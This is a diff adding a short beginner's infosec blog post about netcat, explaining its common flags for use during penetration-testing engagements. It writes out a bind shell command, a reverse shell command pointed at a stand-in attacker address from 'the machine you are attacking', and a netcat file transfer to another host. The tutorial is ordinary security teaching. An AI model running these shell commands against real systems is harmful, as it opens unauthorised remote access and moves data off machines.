@@ -1,0 +1,54 @@
+Infosec Intro- Netcat aka nc
+------------------
+
+This post I am going to focus on Netcat, the tcp/ip swiss army knife
+
+### What is it
+
+Netcat is described as the swiss army knife of tcp/ip, it's great for setting up adhoc servers for a multitude of reasons
+
+### Why
+
+At some point in an engagement, you are going to want to send a file, setup a quick bind shell, or reverse shell. This is where nc will come in and be the savior your require. Even better, busybox, which is used in a lot of embedded environments, also has an implementation of netcat that will allow for some of these shenanigans.
+
+### Examples
+
+The flags that I tend to use most often are:
+
+* `-n` don't waste time doing dns lookups
+* `-l` listen for incoming connections
+* `-v` verbose mode
+* `-p` port to use when listening
+* `-e` send the input/output to a specific binary, ie for doing bind/reverse shells
+
+To make a bind shell, that is a shell that listens on a port you can do:
+
+    nc -nlvp 1337 -e /bin/bash
+
+Be aware this would allow someone to connect to port `1337` and have a shell as the user running the nc command. But what if the box you are able to run commands on is firewalled off?  You can then 'send' a reverse shell back to a box you control.
+
+On your machine listen for incoming connections:
+
+    nc -nlvp 1337
+
+and then on the machine you are attacking
+
+    nc 1.2.3.4 1337 -e /bin/sh
+
+which will 'send' the shell to you! great! You can also use `nc` to send a file to another machine, on the recieving machine:
+
+    nc -nlvp 1337 > incoming.file
+
+and then on the sending machine
+
+    nc other.machines.public.ip < file.to.send
+
+Sadly, there will be no progress, so you will have to verify this by other means that it has sent correctly.
+
+### References
+
+* [Wikipedia Netcat page](https://en.wikipedia.org/wiki/Netcat)
+* [Sans Netcat cheat sheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)
+
+
+TAGS:infosec,infosecintro
